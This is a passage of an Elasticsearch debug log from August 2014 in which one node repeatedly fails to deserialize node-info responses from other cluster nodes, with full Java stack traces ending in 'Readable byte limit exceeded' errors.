    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:05,258][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [RgzCfs2_RE27p6RgzEb1Jw]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8436
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:595)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:05,276][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [WqnW6SX3TfCLTbBvFcYQgA]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8434
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:595)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:05,283][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [lLjxLWhoSti-hvdAuJ2wUg]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8436
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:596)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:05,855][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [myWkK47kRxSh93CRKH5O3w]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8435
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:595)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:05,856][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [lLjxLWhoSti-hvdAuJ2wUg]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8436
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:596)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:05,856][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [lXDpSZ3OQCu6eVulQVcbiQ]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8528
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:596)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:05,858][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [WqnW6SX3TfCLTbBvFcYQgA]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8434
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:595)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:05,864][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [RgzCfs2_RE27p6RgzEb1Jw]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8436
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
